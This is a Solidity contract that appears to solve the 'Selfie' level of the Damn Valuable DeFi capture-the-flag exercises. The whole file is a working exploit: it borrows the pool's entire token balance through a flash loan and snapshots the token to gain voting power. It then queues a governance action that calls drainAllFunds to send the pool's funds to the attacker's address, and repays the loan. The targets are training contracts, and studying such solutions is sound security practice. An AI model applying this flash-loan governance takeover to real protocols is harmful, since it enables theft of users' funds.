// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
// import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";


contract AttackerContract {

    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public pool;

    address public owner;
    uint256 public actionId;

    constructor(
      address tokenAddress,
      address governanceAddress,
      address selfiePoolAddress
    ) {
      // console.log("tokenAddr", tokenAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
        pool = SelfiePool(selfiePoolAddress);
        owner = msg.sender;
    }

    function receiveTokens(address addr, uint256 amount) external {
        token.snapshot();
        actionId = governance.queueAction(
          address(pool),
          abi.encodeWithSignature('drainAllFunds(address)', owner),
          0
        );
        // Return flash loan 
        token.transfer(address(pool), amount);
        console.log('actionID', actionId);
    }

    function attack() external returns(uint256) {
        pool.flashLoan(token.balanceOf(address(pool)));
        return actionId;
    }
}